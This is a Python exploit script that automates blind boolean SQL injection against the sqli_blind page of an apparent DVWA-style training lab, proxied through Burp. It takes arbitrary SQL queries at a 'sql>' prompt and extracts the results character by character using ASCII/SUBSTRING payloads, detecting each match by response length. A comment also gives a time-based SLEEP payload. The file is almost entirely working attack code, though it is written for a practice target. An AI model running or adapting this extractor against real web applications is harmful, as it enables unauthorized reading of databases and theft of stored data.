#!/usr/bin/env python3

import requests
import string
import sys
import urllib

"""
POST /vulnerabilities/sqli_blind/ HTTP/1.1
Host: lab
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://lab
Connection: close
Referer: http://lab/vulnerabilities/sqli_blind/
Cookie: PHPSESSID=m5do28oacr1fcpal9q7iav29u3; security=medium
Upgrade-Insecure-Requests: 1

id=1&Submit=Submit
"""

urlencode = urllib.parse.quote

def loop_inject(original_inject):

    letters = ''.join(string.ascii_letters + string.digits + string.punctuation)

    for char in letters:

        edit_inject = original_inject.replace("CHAR", str(ord(char)))

        burp_url = "http://lab/vulnerabilities/sqli_blind/"
        burp_data = "id={}&Submit=Submit".format(urlencode(edit_inject))

        burp_cookies = {"PHPSESSID":"ta23j7dh9m0hukuvpds9phg9n3",
            "security":"low"}

        burp_headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate",
            "Connection":"Close",
            "Upgrade-Insecure-Requests":"1"}

        burp_proxy = {"http":"http://127.0.0.1:8080",
            "https":"https://127.0.0.1:8080"}

        r = requests.post(burp_url, data=burp_data, headers=burp_headers, cookies=burp_cookies, proxies=burp_proxy)

        if int(r.headers['Content-Length']) != 4705:
            return char

    return "\n\n"

def main():

    while True:

        query = input("sql> ")
        if "quit" in query:
            sys.exit(-1)

        for i in range(1,256):

            # send our injection -- known good injection: 1 AND SLEEP(4)#
            original_inject = str("1 AND ASCII(SUBSTRING(({}),{},1))=CHAR#").format(query, i)
            get_char = str(loop_inject(original_inject))

            # once we exit with a true value, write to console
            sys.stdout.write(get_char)
            sys.stdout.flush()

            if loop_inject(original_inject) == "\n\n":
                break

main()